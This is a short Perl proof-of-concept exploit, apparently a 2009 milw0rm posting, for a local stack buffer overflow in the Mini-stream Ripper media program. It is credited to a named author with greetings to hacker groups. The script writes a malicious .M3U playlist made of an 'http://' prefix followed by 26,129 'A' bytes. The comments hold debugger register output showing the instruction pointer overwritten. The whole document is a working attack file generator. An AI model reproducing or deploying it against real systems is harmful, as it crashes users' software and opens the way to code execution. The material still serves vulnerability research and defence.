#!/usr/bin/perl
#
#
# *************************************************************
# *  Mini-stream Ripper (.M3U File) Local Stack Overflow POC  *
# *************************************************************
#
# Found By : Cyber-Zone (ABDELKHALEK)
# E-mail   : Paradis_des_fous@hotmail.fr
# Home     : WwW.IQ-TY.CoM ; WwW.No-Exploit.CoM
# Greetz   : Hussin X , Jiko (my brother), ZoRLu , Nabilx , Mag!c ompo , Stack ... all mgharba HaCkers and Sec-r1z.com
#
# Download product : http://www.rm-to-mp3.net/downloads/Mini-streamRipper.exe
#
#
# Olly registers
#EAX 00000001
#ECX 41414141
#EDX 00D30000
#EBX 00333D60 ASCII "C:\Documents and Settings\Administrateur\Bureau\KHAL.m3u"
#ESP 000F70CC ASCII "AAAA"
#EBP 000FBFB4
#ESI 77C2FCE0 msvcrt.77C2FCE0
#EDI 0000CC2E
#EIP 41414141
#
my $Header = "#EXTM3U\n";

my $ex="http://"."A" x 26129; # note exact this just the POC

open(MYFILE,'>>KHAL.m3u');

print MYFILE $Header.$ex;

close(MYFILE);

# milw0rm.com [2009-04-13]